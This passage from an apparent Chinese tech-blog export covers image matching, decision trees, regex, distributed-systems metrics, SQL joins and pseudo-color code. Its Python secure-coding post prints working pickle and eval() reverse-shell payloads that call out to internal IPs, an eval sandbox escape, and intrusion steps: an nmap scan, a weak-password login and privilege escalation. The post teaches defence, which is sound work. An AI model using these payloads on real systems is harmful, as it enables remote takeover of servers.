findpt = now_w, now_h if findpt is not None: cv2.rectangle(img, findpt, (findpt[0] + fw, findpt[1] + fh), (255, 0, 0)) return img 欧氏距离匹配12345678910111213141516171819202122232425262728293031323334def show_pic_location(img, findimg): &quot;&quot;&quot; show_pic_location :param img: :param findimg: :return: &quot;&quot;&quot; w = img.shape[1] h = img.shape[0] fw = findimg.shape[1] fh = findimg.shape[0] minds = 1e8 mincb_h = 0 mincb_w = 0 for now_h in xrange(h - fh): for now_w in xrange(w - fw): my_img = img[now_h:now_h + fh, now_w: now_w + fw, :] my_findimg = findimg myx = np.array(my_img) myy = np.array(my_findimg) dis = np.sqrt(np.sum((myx - myy) * (myx - myy))) if dis &lt; minds: mincb_h = now_h mincb_w = now_w minds = dis print mincb_h, mincb_w, minds findpt = mincb_w, mincb_h cv2.rectangle(img, findpt, (findpt[0] + fw, findpt[1] + fh), (0, 0, 255)) return img 添加噪音123456789101112131415def add_noise(img): &quot;&quot;&quot; add_noise :param img: :return: &quot;&quot;&quot; count = 50000 for k in xrange(count): xi = int(np.random.uniform(0, img.shape[1])) xj = int(np.random.uniform(0, img.shape[0])) img[xj, xi, 0] = 255 * np.random.rand() img[xj, xi, 1] = 255 * np.random.rand() img[xj, xi, 2] = 255 * np.random.rand() 原始图像 待匹配图像 加噪点匹配图像 旋转加噪点匹配图像 完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#! /usr/bin/python# -*- coding:utf-8 -*-&quot;&quot;&quot;@author: abc@file: euclidean_distance.py@date: 2016-12-09@desc: 欧式距离匹配&quot;&quot;&quot;__author__ = &quot;abc&quot;import cv2import numpy as npdef show_pic_location(img, findimg): &quot;&quot;&quot; show_pic_location :param img: :param findimg: :return: &quot;&quot;&quot; w = img.shape[1] h = img.shape[0] fw = findimg.shape[1] fh = findimg.shape[0] minds = 1e8 mincb_h = 0 mincb_w = 0 for now_h in xrange(h - fh): for now_w in xrange(w - fw): my_img = img[now_h:now_h + fh, now_w: now_w + fw, :] my_findimg = findimg dis = get_euclidean_distance(my_img, my_findimg) if dis &lt; minds: mincb_h = now_h mincb_w = now_w minds = dis print mincb_h, mincb_w, minds findpt = mincb_w, mincb_h cv2.rectangle(img, findpt, (findpt[0] + fw, findpt[1] + fh), (0, 0, 255)) return imgdef get_euclidean_distance(x, y): &quot;&quot;&quot; 计算欧氏距离 :param x: :param y: :return: &quot;&quot;&quot; myx = np.array(x) myy = np.array(y) return np.sqrt(np.sum((myx - myy) * (myx - myy)))def add_noise(img): &quot;&quot;&quot; add_noise :param img: :return: &quot;&quot;&quot; count = 50000 for k in xrange(count): xi = int(np.random.uniform(0, img.shape[1])) xj = int(np.random.uniform(0, img.shape[0])) img[xj, xi, 0] = 255 * np.random.rand() img[xj, xi, 1] = 255 * np.random.rand() img[xj, xi, 2] = 255 * np.random.rand()def handle_img(imgpath, imgpath1, imgpath2): &quot;&quot;&quot; handle_img :param imgpath: :param imgpath1: :param imgpath2: :return: &quot;&quot;&quot; myimg = cv2.imread(imgpath) myimg1 = cv2.imread(imgpath1) myimg2 = cv2.imread(imgpath2) add_noise(myimg) myimg = show_pic_location(myimg, myimg1) myimg = show_pic_location(myimg, myimg2) cv2.namedWindow(&#x27;img&#x27;) cv2.imshow(&#x27;img&#x27;, myimg) cv2.waitKey() cv2.destroyAllWindows()if __name__ == &quot;__main__&quot;: imgpath = &quot;/home/abc/Projects/machine_learning/img/test_r45.png&quot; imgpath1 = &quot;/home/abc/Projects/machine_learning/img/test_1.png&quot; imgpath2 = &quot;/home/abc/Projects/machine_learning/img/test_2.png&quot; handle_img(imgpath, imgpath1, imgpath2)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://noogel.xyz/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://noogel.xyz/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"决策树","slug":"关于技术/数据结构与算法思想/机器学习/决策树","date":"2016-10-30T00:00:00.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2016/10/30/1.html","link":"","permalink":"https://noogel.xyz/2016/10/30/1.html","excerpt":"","text":"简单解释：熵 为信息的期望值，计算公式如下。 $$ info(D) &#x3D; -\\sum_{i&#x3D;1}^m p_i log_2(p_i) $$ 信息增益 是指在划分数据集之前之后信息发生的变化。对信息按属性A划分后取得的熵。$$ info_A(D) &#x3D; \\sum_{j&#x3D;1}^v \\frac{|D_j|}{|D|}info(D_j) $$ 计算两者之间的变化就是信息增益。$$ gain(A) &#x3D; info(D) - info_A(D) $$ 如下算法计算最大信息增益。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#! /data/sever/python/bin/python# -*- coding:utf-8 -*-&quot;&quot;&quot;决策树算法&quot;&quot;&quot;from __future__ import divisionimport mathimport operatorfrom collections import Counter__author__ = &#x27;xyz&#x27;def calc_shannon_ent(data_set): &quot;&quot;&quot; 计算香农熵 :param data_set: :return: &quot;&quot;&quot; data_length = len(data_set) label_counts = Counter([val[-1] for val in data_set]) pilog2pi = [val / data_length * math.log(val / data_length, 2) for val in label_counts.itervalues()] return - reduce( operator.add, pilog2pi ) if pilog2pi else 0def split_data_set(data_set, axis, value): &quot;&quot;&quot; 分割数据集，筛选指定特征下的数据值的集合 :param data_set: 数据集合 :param axis: 第几列 :param value: 筛选的值 :return: 除去axis列的，并且axis列的值为value的的数据集合 &quot;&quot;&quot; return [[v for i, v in enumerate(val) if i != axis] for val in data_set if val[axis] == value]def choose_best_feature_to_split(data_set): &quot;&quot;&quot; 选择最好的数据集划分方式 :param data_set: 数据集 :return: 划分方式最好是第几项 &quot;&quot;&quot; base_ent = calc_shannon_ent(data_set) # 定义最好的信息增益，信息增益最好的那项 best_info_gain, best_feature = 0.0, -1 for i in range(len(data_set[0]) - 1): unique_value = set(data_set[i]) child_ent = 0.0 for val in unique_value: child_data_set = split_data_set(data_set, i, val) child_ent += (len(data_set) - 1) / len(data_set) * calc_shannon_ent(child_data_set) # 信息增益 info_gain = base_ent - child_ent if info_gain &gt; best_info_gain: best_info_gain = info_gain best_feature = i return best_featuredef majority_ent(class_list): &quot;&quot;&quot; 取出出现次数最多的标签 :param class_list: :return: &quot;&quot;&quot; class_count = Counter(class_list) sorted_class_count = sorted(class_count.items(), key=lambda x, y: cmp(x[1], y[1]), reverse=True) return sorted_class_count[0][0]def create_tree(data_set, labels): &quot;&quot;&quot; 创建树 :param data_set: 数据集 :param labels: 标签集合 :return: 决策树 &quot;&quot;&quot; class_list = [val[-1] for val in data_set] if class_list.count(class_list[0]) == len(class_list): return class_list[0] if len(data_set[0]) == 1: return majority_ent(class_list) best_feat = choose_best_feature_to_split(data_set) best_feat_label = labels[best_feat] my_tree = &#123;best_feat_label: &#123;&#125;&#125; del labels[best_feat] feat_values = [val[best_feat] for val in data_set] unique_vals = set(feat_values) for value in unique_vals: sub_labels = labels[:] my_tree[best_feat_label][value] = create_tree(split_data_set(data_set, best_feat, value), sub_labels) return my_treeif __name__ == &quot;__main__&quot;: data_set = [[1, 1, &#x27;yes&#x27;], [1, 1, &#x27;yes&#x27;], [1, 0, &#x27;no&#x27;], [0, 1, &#x27;no&#x27;], [0, 1, &#x27;no&#x27;]] # 计算熵 print calc_shannon_ent(data_set) # 分割数据集 print split_data_set(data_set, 0, 1) # 获取最大信息增益项 print choose_best_feature_to_split(data_set) # 生成决策树 print create_tree(data_set, [&#x27;no surfacing&#x27;, &#x27;flippers&#x27;]) ID3算法 ID3算法就是在每次需要分裂时，计算每个属性的增益率，然后选择增益率最大的属性进行分裂。 C4.5算法定义分裂信息 $$ splitInfo_A(D) &#x3D; - \\sum_{j&#x3D;1}^v \\frac{|D_j|}{|D|} log_2(\\frac{|D_j|}{|D|}) $$ 定义增益率 $$ gain\\_ratio(A) &#x3D; \\frac{gain(A)}{split\\_info(A)} $$ C4.5选择具有最大增益率的属性作为分裂属性。http://www.cnblogs.com/leoo2sk/archive/2010/09/19/decision-tree.html决策树到底是干嘛用的，怎么去灵活运用决策树？","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://noogel.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"Python安全编码","slug":"关于技术/程序语言/Python安全编码","date":"2016-10-16T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2016/10/16/1.html","link":"","permalink":"https://noogel.xyz/2016/10/16/1.html","excerpt":"","text":"什么是代码注入代码注入攻击指的是任何允许攻击者在网络应用程序中注入源代码，从而得到解读和执行的方法。 ###Python中常见代码注入能够执行一行任意字符串形式代码的eval()函数 1&gt;&gt;&gt; eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;) 能够执行字符串形式代码块的exec()函数 1&gt;&gt;&gt; exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;) 反序列化一个pickled对象时 1&gt;&gt;&gt; pickle.loads(&quot;cposix\\nsystem\\np0\\n(S&#x27;uname -a&#x27;\\np1\\ntp2\\nRp3\\n.&quot;) 执行一个Python文件 1&gt;&gt;&gt; execfile(&quot;testf.py&quot;) pickle.loads()代码注入某不安全的用法： 12345678910111213141516def load_session(self, session_id=None): if not session_id: session_id = self.gen_session_id() session = Session(session_id, self) else: try: data = self.backend.get(session_id) if data: data = pickle.loads(data) assert type(data) == dict else: data = &#123;&#125; except: data = &#123;&#125; session = Session(session_id, self, data)return session 注入的代码： 1234567891011121314151617&gt;&gt;&gt; import os&gt;&gt;&gt; import pickle&gt;&gt;&gt; class exp(object):... def __reduce__(self):... s = &quot;/bin/bash -c \\&quot;/bin/bash -i &gt; \\/dev/tcp/192.168.42.62/12345 0&lt;&amp;1 2&gt;&amp;1 &amp;\\&quot;&quot;... return (os.system, (s,))...&gt;&gt;&gt; e = exp()&gt;&gt;&gt; e&lt;__main__.exp object at 0x7f734afa8790&gt;&gt;&gt;&gt; k = pickle.dumps(e)&#x27;cposix\\nsystem\\np0\\n(S\\&#x27;/bin/bash -c &quot;/bin/bash -i &gt; \\\\\\\\/dev/tcp/192.168.42.62/12345 0&lt;&amp;1 2&gt;&amp;1 &amp;&quot;\\&#x27;\\np1\\ntp2\\nRp3\\n.&#x27; &gt;&gt;&gt; pickle.loads(k)0&gt;&gt;&gt;[3]+ Stopped python 这些函数使用不当都很危险os.systemos.popen*os.spawn*os.exec*os.openos.popen*commands.*subprocess.popenpopen2.* 一次模拟的实践通过这次实践发现系统中的诸多安全薄弱的环节，执行流程如下： nmap扫描IP nmap -v -A *.*.*.* -p 1-65535，通过nmap扫描后会发现公开的服务。 暴力破解登录名密码 test 123，弱口令登陆系统。这个地方的薄弱点在于开发过程中容易留下便于程序员测试后门或若口令。 成功登陆系统后寻找代码注入点，通过成功找到注入点后可执行代码注入通过反向shell连接服务器提权eval(&quot;__import__(&#39;os&#39;).system(&#39;/bin/bash -c \\&quot;/bin/bash -i &gt; /dev/tcp/10.10.10.130/12345 0&lt;&amp;1 2&gt;&amp;1 &amp;\\&quot;&#39;)&quot;) todo 第三步在整个系统中发现了两个可进行代码注入的漏洞，第一个为pickl反序列化用户登录信息的时候没有做校验，这样当对应的存储介质（memcache、redis）没有开启登录认证并且暴漏在公网中很容易注入代码。第二个为在系统中一些配置直接使用eval函数执行配置中的Python代码进行注入。todo 反向shell介绍 如何安全编码 严格控制输入，过滤所有危险模块，遇到非法字符直接返回。 使用ast.literal_eval()代替eval() 安全使用pickle 下面就着几个点来说一下： eval()方法注释：12eval(source[, globals[, locals]]) -&gt; valueEvaluate the source in the context of globals and locals. The source may be a string representing a Python expression or a code object as returned by compile(). The globals must be a dictionary and locals can be any mapping, defaulting to the current globals and locals. If only globals is given, locals defaults to it. ast.literal_eval()方法注释：1Safely evaluate an expression node or a string containing a Python expression. The string or node provided may only consist of the following Python literal structures: strings, numbers, tuples, lists, dicts, booleans, and None. 使用ast.literal_eval()代替eval()对比：1234567ast.literal_eval(&quot;1+1&quot;) # ValueError: malformed stringast.literal_eval(&quot;[1, 2, 3]&quot;) # [1, 2, 3]ast.literal_eval(&quot;&#123;1: 1, 2: 2, 3: 3&#125;&quot;) # &#123;1: 1, 2: 2, 3: 3&#125;ast.literal_eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;) # ValueError: malformed stringeval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;) # Linux zhangxu-ThinkPad-T450 3.13.0-92-generic #139-Ubuntu SMP Tue Jun 28 20:42:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linuxeval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;, &#123;&#125;, &#123;&#125;) # Linux zhangxu-ThinkPad-T450 3.13.0-92-generic #139-Ubuntu SMP Tue Jun 28 20:42:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linuxeval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;, &#123;&quot;__builtins__&quot;: &#123;&#125;&#125;, &#123;&#125;) # NameError: name &#x27;__import__&#x27; is not defined eval禁用全局或本地变量：123&gt;&gt;&gt; global_a = &quot;Hello Eval!&quot;&gt;&gt;&gt; eval(&quot;global_a&quot;)&gt;&gt;&gt; eval(&quot;global_a&quot;, &#123;&#125;, &#123;&#125;) 寻找eval的突破点eval(&quot;[c for c in ().__class__.__bases__[0].__subclasses__()]&quot;, &#123;&#39;__builtins__&#39;:&#123;&#125;&#125;) 参考点： 123456789( lambda fc=( lambda n: [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == n][0] ): fc(&quot;function&quot;)( fc(&quot;code&quot;)( 0, 0, 0, 0, &quot;KABOOM&quot;, (), (), (), &quot;&quot;, &quot;&quot;, 0, &quot;&quot;), &#123;&#125;)())() 安全使用pickle1234567891011121314151617181920212223242526272829&gt;&gt;&gt; import hmac&gt;&gt;&gt; import hashlib&gt;&gt;&gt; import pickle&gt;&gt;&gt; shared_key = &#x27;123456&#x27;&gt;&gt;&gt; class Exp(object):... def __reduce__(self):... s = &quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;... return (os.system, (s,))...&gt;&gt;&gt; e = Exp()&gt;&gt;&gt; s = pickle.dumps(e)&gt;&gt;&gt; s&#x27;cposix\\nsystem\\np0\\n(S&quot;__import__(\\&#x27;os\\&#x27;).system(\\&#x27;uname -a\\&#x27;)&quot;\\np1\\ntp2\\nRp3\\n.&#x27;&gt;&gt;&gt; k = hmac.new(shared_key, s, hashlib.sha1).hexdigest()&gt;&gt;&gt; k&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d&#x27;&gt;&gt;&gt; send_s = k + &#x27; &#x27; + s&gt;&gt;&gt; send_s&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d cposix\\nsystem\\np0\\n(S&quot;__import__(\\&#x27;os\\&#x27;).system(\\&#x27;uname -a\\&#x27;)&quot;\\np1\\ntp2\\nRp3\\n.&#x27;&gt;&gt;&gt; recv_k, recv_s = send_s.split(&#x27; &#x27;, 1)&gt;&gt;&gt; recv_k, recv_s(&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d&#x27;, &#x27;cposix\\nsystem\\np0\\n(S&quot;__import__(\\&#x27;os\\&#x27;).system(\\&#x27;uname -a\\&#x27;)&quot;\\np1\\ntp2\\nRp3\\n.&#x27;)&gt;&gt;&gt; new_k = hmac.new(shared_key, recv_s, hashlib.sha1).hexdigest()&gt;&gt;&gt; new_k&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d&#x27;&gt;&gt;&gt; diff_k = hmac.new(shared_key + &quot;123456&quot;, recv_s, hashlib.sha1).hexdigest()&gt;&gt;&gt; diff_k&#x27;381542893003a30d045c5c729713d2aa428128de&#x27;&gt;&gt;&gt; 如何提高安全编码意识？参考资料http://www.programcreek.com/python/example/5578/ast.literal_evalhttps://segmentfault.com/a/1190000002783940http://www.yunweipai.com/archives/6540.htmlhttp://blog.csdn.net/chence19871/article/details/32718219http://coolshell.cn/articles/8711.htmlhttp://stackoverflow.com/questions/15197673/using-pythons-eval-vs-ast-literal-evalhttps://www.cigital.com/blog/python-pickling/https://github.com/greysign/pysec/blob/master/safeeval.py 附录nmap扫描部分结果What is nmap?Nmap (Network Mapper) is a security scanner originally written by Gordon Lyon used to discover hosts and services on a computer network, thus creating a “map” of the network. -A: Enable OS detection, version detection, script scanning, and traceroute-v: Increase verbosity level (use -vv or more for greater effect)-p : Only scan specified ports 1234567891011121314151617181920212223242526272829root@bt:~# nmap -v -A *.*.*.* -p 1-65535 Starting Nmap 6.25 ( http://nmap.org ) at 2016-07-26 13:30 EDT......Not shown: 65527 filtered portsPORT STATE SERVICE VERSION139/tcp open netbios-ssn1723/tcp open pptp Microsoft8891/tcp open http nginx 1.4.49090/tcp closed zeus-admin13228/tcp open http Microsoft IIS httpd 7.514580/tcp closed unknown36666/tcp open unknown64380/tcp open unknown......Device type: general purpose|storage-miscRunning (JUST GUESSING): Linux 2.4.X (99%), Microsoft Windows 7 (95%), BlueArc embedded (91%)OS CPE: cpe:/o:linux:linux_kernel:2.4 cpe:/o:microsoft:windows_7:::enterprise cpe:/h:bluearc:titan_2100Aggressive OS guesses: DD-WRT v24-sp2 (Linux 2.4.37) (99%), Microsoft Windows 7 Enterprise (95%), BlueArc Titan 2100 NAS device (91%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsTCP Sequence Prediction: Difficulty=259 (Good luck!)IP ID Sequence Generation: IncrementalService Info: OS: Windows; CPE: cpe:/o:microsoft:windows......NSE: Script Post-scanning.Read data files from: /usr/local/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 895.44 seconds Raw packets sent: 262711 (11.560MB) | Rcvd: 55220 (2.209MB) Links：http://www.cyberciti.biz/networking/nmap-command-examples-tutorials/ 反向Shellhttp://os.51cto.com/art/201312/424378.htm","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://noogel.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"正则表达式 Cheatsheet","slug":"关于技术/效率/正则表达式","date":"2016-01-09T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2016/01/09/1.html","link":"","permalink":"https://noogel.xyz/2016/01/09/1.html","excerpt":"","text":"用来匹配和处理文本的字符串。 基本用途是查找和替换。一种不完备的程序设计语言。 锚点^ 字符串开头，或多行模式中的行开头\\A 字符串的开始$ 字符串结尾，或多行模式中的行尾\\Z 字符串结束\\b 字边界\\B 不是单词边界\\&lt; 词的开头\\&gt; 词尾 字符集\\c 控制字符\\s 任何一个空白字符（[\\f\\n\\r\\t\\v]）\\S 任何一个非空白字符（[^\\f\\n\\r\\t\\v]）\\d 任何一个数字字符\\D 任何一个非数字字符\\w 任何一个字母数字字符或下划线字符（[a-zA-Z0-9_]）\\W 任何一个非字母数字或非下划线字符（[^a-zA-Z0-9_]）\\x 十六进制数字\\O 八进制数 量词+ 1 个或更多* 0 个或更多? 0 个或 1 个&#123;&#125; 匹配指定个数&#123;3&#125; 精确的 3 个&#123;3,&#125; 3 个或更多&#123;3,5&#125; 3,4,5 添加 ? 表示非贪婪模式，懒惰型匹配，匹配最小子集。 123+?*?&#123;n,&#125;? 断言?= 前瞻断言?! 负前瞻?&lt;= 后向断言?!= or ?&lt;! 负面回顾?&gt; 一次性子表达式?() 条件 [if then]?()| 条件 [if then else]?# 评论 转移\\ 转义后面的字符\\Q Begin literal sequence\\E End literal sequence 『转义』是一种处理正则表达式中具有特殊含义的字符的方式，而不是特殊字符。 常用元字符^[.$&#123;*(\\+)|?&lt;&gt; 特殊字符\\n 新行\\r 回车\\t 制表符\\v 垂直制表符\\f Form feed\\xxx 八进制字符 xxx\\xhh 十六进制字符 hh 组合范围. 除换行符 (\\n) 以外的任何字符(a|b) a 或 b(...) 组(?:...) 被动（非捕获）组[abc] 范围 a b c[^abc] not (a or b or c)[a-q] 从 a 到 q 的小写字母[A-Q] 从 A 到 Q 的大写字母[0-7] 从 0 到 7 的数字\\x 组&#x2F;子模式编号『x』 范围包括在内。 例子回溯引用下面例子匹配 空格 字符 空格下面的例子使回溯引用解释回溯引用，\\1用来获取(\\w+)中的字符串。第一个匹配上的of被\\1引用，就变成表达式[ ]+(\\w+)[ ]+of。其中\\1代表模式里的第一个子表达式，\\2就会代表着第二个子表达式，以此递推。 替换 大小写转换测试工具不支持，待测试 向前查找、向后查找必须要放到一个字表达式中，如下例子，根据:来匹配，但是不消费他。(?=) 向前查找 (?&lt;=) 向后查找 (?!) 负向前查找(?&lt;!) 负向后查找 嵌入条件(?(brackreference)true-regex)其中?表明这是一个条件，括号里的brackreference是一个回溯引用，true-regex是一个只在backreference存在时才会被执行的子表达式。 不区分大小写匹配 字符区间匹配 取非匹配 匹配多个字符 子表达式 匹配四位数的年份 嵌入查找、向后查找组合应用","categories":[],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://noogel.xyz/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"分布式系统常用指标","slug":"关于技术/理论知识/分布式系统常用指标","date":"2015-07-18T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2015/07/18/1.html","link":"","permalink":"https://noogel.xyz/2015/07/18/1.html","excerpt":"","text":"性能指标 吞度量 响应延迟 P95 P999 并发量 可用性指标 可提供的服务时间 &#x2F; (可提供的服务时间 + 不可提供的服务时间) 请求成功次数 &#x2F; 总请求次数 可扩展性指标是否能实现水平扩展，通过增加服务器数量增加计算能力、存储容量等。 存储系统中有两种扩展方式：Scale Out（也就是Scale horizontally）横向扩展，比如在原有系统中新增一台服务器。Scale Up（也就是Scale vertically）纵向扩展，在原有机器上增加 CPU 、内存。 一致性指标实现多副本之间一致性的能力。不同的应用场景对于数据一致性指标要求不同，需要根据场景做具体的评估。 水平拆分和垂直拆分ACID原子性（Atomicity）一致性（Atomicity）隔离性（Isolation）持久性（Durability） CAP（帽子理论）一致性（Consistency）可用性（Availability）可靠性（Partition tolerance 分区容错性） BASE基本可用（Basically Available）软状态（Soft State）最终一致（Eventually Consistent） 分布式一致性协议TX协议XA协议 两阶段提交协议三阶段提交协议TCC最终一致性模式","categories":[],"tags":[{"name":"分布式系统","slug":"分布式系统","permalink":"https://noogel.xyz/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/"}]},{"title":"SQL的几种连接","slug":"关于技术/中间件/SQL的几种连接","date":"2014-10-16T00:00:00.000Z","updated":"2025-07-23T07:30:58.914Z","comments":true,"path":"2014/10/16/1.html","link":"","permalink":"https://noogel.xyz/2014/10/16/1.html","excerpt":"","text":"SQL连接可以分为内连接、外连接、交叉连接。 数据库数据： 内连接 等值连接：在连接条件中使用等于号(&#x3D;)运算符比较被连接列的列值，其查询结果中列出被连接表中的所有列，包括其中的重复列。 不等值连接：在连接条件使用除等于运算符以外的其它比较运算符比较被连接的列的列值。这些运算符包括&gt;、&gt;&#x3D;、&lt;&#x3D;、&lt;、!&gt;、!&lt;和&lt;&gt;。 自然连接：在连接条件中使用等于(&#x3D;)运算符比较被连接列的列值，但它使用选择列表指出查询结果集合中所包括的列，并删除连接表中的重复列。 内连接：内连接查询操作列出与连接条件匹配的数据行，它使用比较运算符比较被连接列的列值。select * from book as a,stu as b where a.sutid = b.stuidselect * from book as a inner join stu as b on a.sutid = b.stuid 内连接可以使用上面两种方式，其中第二种方式的inner可以省略。 其连接结果如上图，是按照a.stuid &#x3D; b.stuid进行连接。 外连接 左联接：是以左表为基准，将a.stuid &#x3D; b.stuid的数据进行连接，然后将左表没有的对应项显示，右表的列为NULLselect * from book as a left join stu as b on a.sutid = b.stuid 右连接：是以右表为基准，将a.stuid &#x3D; b.stuid的数据进行连接，然以将右表没有的对应项显示，左表的列为NULLselect * from book as a right join stu as b on a.sutid = b.stuid 全连接：完整外部联接返回左表和右表中的所有行。当某行在另一个表中没有匹配行时，则另一个表的选择列表列包含空值。如果表之间有匹配行，则整个结果集行包含基表的数据值。select * from book as a full outer join stu as b on a.sutid = b.stuid 交叉连接交叉连接：交叉联接返回左表中的所有行，左表中的每一行与右表中的所有行组合。交叉联接也称作笛卡尔积。select * from book as a cross join stu as b order by a.id","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://noogel.xyz/tags/SQL/"}]},{"title":"伪彩色处理","slug":"关于技术/数据结构与算法思想/图像处理/伪彩色处理","date":"2014-04-22T00:00:00.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2014/04/22/1.html","link":"","permalink":"https://noogel.xyz/2014/04/22/1.html","excerpt":"","text":"伪彩色处理是指将灰度图像转换成彩色图象。因为人眼对于彩色的分辨能力远高于对灰度图像的分辨能力，所以将灰度图像转换成彩色可以提高人眼对图像细节的辨别能力。伪彩色并不能真实的反映图像像的彩色情况。 效果图： 强度分层法和灰度级-彩色变换法：（1）强度分层法是伪彩色处理技术中最简单的一种。在某个灰度级Li上设置一个平行于x-y平面的切割平面，切割平面下面的，即灰度级小于Li的像素分配给一种颜色，相应的切割平面上大于灰度级Li的像素分配给另一种颜色。这样切割结果可以分成两层的伪彩色。可以使用M个平面去切割，就会得到M个不同灰度级的区域，这样就是具有M种颜色的为彩色图像。这种方法虽然简单，但是视觉效果不理想。（2）灰度级-彩色变换法可以将灰度图像变为具有多种颜色渐变的连续彩色图像。主要就是将图像通过不同变换特性的红、绿、蓝3个变换器，然后将三个颜色通道的输出合成某种颜色。由于三种颜色变换的不同，使得不同大小灰度级可以合成不同的颜色。一组典型的变换传递函数如下图。 这里面需要注意的地方，代码只能是处理JPG格式的灰度图像，因为JPG图像的颜色深度是24位表示（R,G,B），每像素由3个字节表示即可，然而PNG图像的颜色深度是32位表示（R,G,B,A）。 下面的代码是测试代码，以处理24位深度的图像为例，同像素不同通道的颜色值要相同，组合表示出是具有一定灰度的颜色。在实际应用中需要修改下面的代码依据要处理的图像格式。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#region 伪彩色图像处理/// &lt;summary&gt;/// 伪彩色图像处理/// 博客园-初行 http://www.cnblogs.com/zxlovenet/// 日期：2014.2.14/// &lt;/summary&gt;/// &lt;param name=&quot;bmp&quot;&gt;传入的灰度图像&lt;/param&gt;/// &lt;param name=&quot;method&quot;&gt;使用何种方法，false强度分层法,true灰度级-彩色变换法&lt;/param&gt;/// &lt;param name=&quot;seg&quot;&gt;强度分层中的分层数&lt;/param&gt;/// &lt;returns&gt;返回伪彩色图像&lt;/returns&gt;private Bitmap gcTrans(Bitmap bmp, bool method, byte seg)&#123; if (bmp != null) &#123; if (System.Drawing.Imaging.PixelFormat.Format24bppRgb == bmp.PixelFormat) &#123; Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height); System.Drawing.Imaging.BitmapData bmpData = bmp.LockBits(rect, System.Drawing.Imaging.ImageLockMode.ReadWrite, bmp.PixelFormat); IntPtr ptr = bmpData.Scan0; int bytes = bmp.Width * bmp.Height * 3; byte[] grayValues = new byte[bytes]; System.Runtime.InteropServices.Marshal.Copy(ptr, grayValues, 0, bytes); bmp.UnlockBits(bmpData); byte[] rgbValues = new byte[bytes]; //清零 Array.Clear(rgbValues, 0, bytes); byte tempB; if (method == false) &#123; //强度分层法 for (int i = 0; i &lt; bytes; i += 3) &#123; byte ser = (byte)(256 / seg); tempB = (byte)(grayValues[i] / ser); //分配任意一种颜色 rgbValues[i + 1] = (byte)(tempB * ser); rgbValues[i] = (byte)((seg - 1 - tempB) * ser); rgbValues[i + 2] = 0; &#125; &#125; else &#123; //灰度级-彩色变换法 for (int i = 0; i &lt; bytes; i += 3) &#123; if (grayValues[i] &lt; 64) &#123; rgbValues[i + 2] = 0; rgbValues[i + 1] = (byte)(4 * grayValues[i]); rgbValues[i] = 255; &#125; else if (grayValues[i] &lt; 128) &#123; rgbValues[i + 2] = 0; rgbValues[i + 1] = 255; rgbValues[i] = (byte)(-4 * grayValues[i] + 2 * 255); &#125; else if (grayValues[i] &lt; 192) &#123; rgbValues[i + 2] = (byte)(4 * grayValues[i] - 2 * 255); rgbValues[i + 1] = 255; rgbValues[i] = 0; &#125; else &#123; rgbValues[i + 2] = 255; rgbValues[i + 1] = (byte)(-4 * grayValues[i] + 4 * 255); rgbValues[i] = 0; &#125; &#125; &#125; bmp = new Bitmap(bmp.Width, bmp.Height, System.Drawing.Imaging.PixelFormat.Format24bppRgb); bmpData = bmp.LockBits(rect, System.Drawing.Imaging.ImageLockMode.ReadWrite, bmp.PixelFormat); ptr = bmpData.Scan0; System.Runtime.InteropServices.Marshal.Copy(rgbValues, 0, ptr, bytes); bmp.UnlockBits(bmpData); return bmp; &#125; else &#123; return null; &#125; &#125; else &#123; return null; &#125;&#125;#endregion 颜色映射： 